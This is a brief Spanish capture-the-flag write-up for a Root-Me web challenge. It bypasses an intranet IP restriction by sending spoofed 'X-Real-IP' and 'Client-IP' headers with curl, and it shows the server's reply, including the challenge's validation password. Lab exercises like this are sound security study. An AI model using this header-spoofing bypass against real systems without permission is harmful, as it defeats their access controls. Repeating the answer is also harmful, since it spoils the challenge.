Dicen que solo podes entrar en la red si estas en la LAN o sea que la IP 
que tenes que decir que tenes es una de localhost o una ip privada que este
en el rango de la red que tienen los tipos estos

# IP Spoofing
Como decirle en capa de applicacion a un servidor que mi IP es una que quiera?

```sh
$ curl "X-Real-IP: 192.168.0.3" -H "Client-IP: 192.168.0.3" -L http://challenge01.root-me.org/web-serveur/ch68
curl: (3) URL rejected: Malformed input to a URL function
<!DOCTYPE html>
<html>
<head>
	<title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
			<h1>Intranet</h1>
		<div>
			Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
		</div>
	</body>
</html>
```

Simplemente agregando los headers correspondientes de *client-ip* y *x-real-ip*

